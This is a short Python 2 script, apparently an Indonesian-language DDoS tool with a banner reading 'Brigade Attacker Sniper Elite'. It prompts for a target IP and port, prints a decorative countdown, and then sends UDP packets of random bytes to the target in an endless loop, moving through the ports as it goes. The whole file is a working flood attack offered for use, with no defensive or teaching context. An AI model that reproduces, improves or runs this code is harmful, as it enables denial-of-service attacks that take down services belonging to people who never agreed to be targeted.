#!/usr/bin/python
# -*- coding: utf-8 -*-
import sys
import os
import time
import socket
import string
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
print("""\033[1;31m \033[92m 
 
 / ::::::::          / :::           / :::::::      / ::::::::                     
 | ::   | ::        / :: ::         | ::————/       | ::————/              
 | ::::::::        / ::_\ ::        | ::::::::      | :::::::            
 | ::   | ::      / :::::::::        \————| ::      | ::———/  
 | ::::::::      / ::     \ ::      | ::::::::      | ::::::::
 |________      /___       \___      \________      \________
                                  
=============================================================
[[  B R I G A D E  A T T A C K E R  S N I P E R  E L I T E ]]
=============================================================
""")
print(" ")
ip = raw_input("\033[94m[*] \033[91mIP \033[91mTARGET-SERANGAN \033[97m>>> \033[93m ")
port = input("\033[94m[*] \033[91mPORT \033[97m>>> \033[93m ")
os.system("clear")
print(" KUN-DDOS SERANGAN AKAN DIMULAI.. 1,2,3")
print(" 0====>>>>     15% ") 
time.sleep(5)
print(" 0==========>>>>      25% ") 
time.sleep(5)
print(" 0================>>>>>       50% ") 
time.sleep(5)
print(" 0========================>>>>>>        75% ") 
time.sleep(5)
print(" 0==================================>>>>>        100% ") 
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1